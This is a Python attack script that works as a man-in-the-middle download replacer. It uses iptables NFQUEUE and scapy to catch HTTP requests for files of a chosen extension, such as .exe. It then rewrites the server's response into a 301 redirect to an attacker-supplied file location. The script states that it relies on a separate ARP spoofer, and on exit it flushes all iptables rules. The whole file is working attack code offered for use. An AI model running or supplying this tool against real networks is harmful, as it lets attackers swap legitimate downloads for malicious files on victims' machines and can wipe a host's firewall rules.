#!/usr/bin/env python

import netfilterqueue      # provides access to packets matched by an iptables rule in Linux. Packets so matched can be accepted, dropped, altered, or given a mark.
import scapy.all as scapy  # handle tasks like scanning and network discovery
import argparse            # get values as arguments
import subprocess          # run() function for shell commands


ack_list = []  # list that contains the acks of TCP handshakes

# function that handles the user arguments
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-e", "--extention", dest="extention", help="Extention of file to modify. (e.g. .exe)")
    parser.add_argument("-l", "--location", dest="location", help="Location of modified file.")
    parser.add_argument("-p", "--preference", dest="preference", help="0 for local, 1 for man-in-the-middle.")
    parser.add_argument("-q", "--queue", dest="queue_num", help="Number(int) of queue.")
    options = parser.parse_args()
    if not options.extention:
        parser.error("[-] Please specify an extention, use --help for more info.")
    elif not options.location:
        parser.error("[-] Please specify a location, use --help for more info.")
    elif not options.preference in ["0", "1"]:
        parser.error("[-] Please specify a preference, use --help for more info.")
    elif not options.queue_num:
        parser.error("[-] Please specify a queue number, use --help for more info.")
    elif not options.queue_num.isdigit():
        parser.error("[-] Queue number must be of type(int), use --help for more info.")
    return options

# function that modifies a packet's raw load
def set_load(packet, load):
    packet[scapy.Raw].load = load
    # remove variables that would corrupt the modified packet, scapy will auto redefine them
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# main function
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # convert payload into a scapy packet
    if scapy_packet.haslayer(scapy.Raw):           # check if packet has a Raw layer
        if scapy_packet[scapy.TCP].dport == 80:    # its a HTTP Request, dport: destination port, port for http
            if file_extention in scapy_packet[scapy.Raw].load.decode("utf-8"):
                print("[+] " + file_extention + " Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)  # Append the TCP ack of a request into a list
        elif scapy_packet[scapy.TCP].sport == 80:             # its a HTTP Response, sport: source port, port for http
            if scapy_packet[scapy.TCP].seq in ack_list:       # if the TCP seq is in the list
                ack_list.remove(scapy_packet[scapy.TCP].seq)  # remove element from list cause it's already used
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://" + modified_file_location + "\n\n")

                packet.set_payload(bytes(modified_packet))  # change the original payload of the packet with the modified one
    packet.accept()  # allow forwarding the packet to it's destination


options = get_arguments()
file_extention = options.extention         # globally set
modified_file_location = options.location  # globally set
queue_num = options.queue_num

if int(options.preference):
    # To run this as man in the middle
    # !! DISCLAIMER: This app doesn't create a man in the middle, you need an arp spoofer running !!
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queue_num])
else:
    # To run this locally
    subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", queue_num])
    subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", queue_num])

queue = netfilterqueue.NetfilterQueue()     # object creation
queue.bind(int(queue_num), process_packet)  # connect to an existed queue

try:
    queue.run()
except KeyboardInterrupt:
    print("\n[!] Detected CTRL + C ... FlUSHING IPTABLES...")
    subprocess.run(["iptables", "--flush"])
    print("[+] Done.")
